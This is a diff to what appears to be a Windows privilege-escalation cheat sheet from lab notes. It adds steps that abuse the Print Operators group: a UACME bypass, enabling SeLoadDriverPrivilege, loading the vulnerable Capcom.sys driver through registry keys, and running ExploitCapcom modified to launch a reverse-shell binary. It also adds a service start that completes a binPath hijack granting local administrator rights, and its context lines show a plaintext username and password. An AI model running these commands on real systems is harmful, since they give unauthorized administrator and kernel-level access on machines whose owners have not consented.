@@ -80,6 +80,36 @@ wevtutil qe Security /rd:true /f:text | Select-String "/user"
 wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
+## Print Operators
+See privileges with the [tool](https://github.com/hfiref0x/UACME)
+```
+Akagi64.exe 23 cmd.exe
+```
+Enable privileges with the [tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) 
+```
+cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+EnableSeLoadDriverPrivilege.exe
+```
+Loading driver
+```
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+Verifiying driver listened
+```
+.\DriverView.exe /stext drivers.txt
+PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
+```
+Exploit with the [tool](https://github.com/tandasat/ExploitCapcom)
+```
+.\ExploitCapcom.exe
+```
+EXploit without GUI
+ExploitCapcom.cpp change this file TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe"); this for a revshell
+```
+TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+```
+
 ## Server Operators
 Read the privileges of the service
 ```
@@ -90,7 +120,10 @@ Change the path
 ```
 sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
 ```
-
+Start services
+```
+sc start AppReadiness
+```
 # Roles
 ## GenericAll
 Creating a Fake SPN
